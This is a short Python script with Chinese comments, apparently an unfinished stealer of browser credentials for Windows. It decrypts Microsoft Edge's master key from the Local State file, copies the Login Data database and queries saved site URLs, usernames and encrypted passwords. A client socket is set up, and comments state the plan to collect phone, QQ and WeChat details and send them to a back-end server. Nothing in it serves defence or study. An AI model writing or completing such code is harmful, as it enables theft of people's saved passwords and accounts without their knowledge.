from socket import *
import os
import json
import base64
import sqlite3
import shutil
client_socket = socket()
from win32crypt import CryptUnprotectData #导入加密模块

#client_socket.connect(('127.0.0.1',6666)) #自己电脑的IP,专用于测试程序

#在自己电脑上,都用127.0.0.1
#设置好服务器后改用服务器地址

#收集 电话,QQ,微信
#先从浏览器下手
appdate_path = os.getenv('localappdata')+'\\Microsoft\\Edge\\User Data'
print(appdate_path) #C:\Users\gbjin\AppData\Local\Microsoft\Edge\User Data\Default\Preferences
# 找到密钥 
text = open(appdate_path+'\\Local State','r',encoding='utf-8').read()
JSON = json.loads(text) #将字符串转换为字典
key = JSON['os_crypt']['encrypted_key'] #找到加密的密钥
key = base64.b64decode(key) [5:]#解码
key = CryptUnprotectData(key,None,None,None,0)[1] #解密
print(key)
# 找到密文
shutil.copy(appdate_path+'\\Default\\Login Data','Login Data') #将文件复制到当前目录
conn = sqlite3.connect('Login Data') #连接数据库
cursor = conn.cursor() #创建游标 cursor = sqlite3.cursor()???
cursor.execute('select action_url,username_value,password_value from logins') #查询
for i in cursor.fetchall(): #遍历
    print(i)
    # username = i[0] #用户名
    # password = i[1] #密码
    # password = CryptUnprotectData(password,None,None,None,0)[1] #解密




# 破解
# 发送给后台
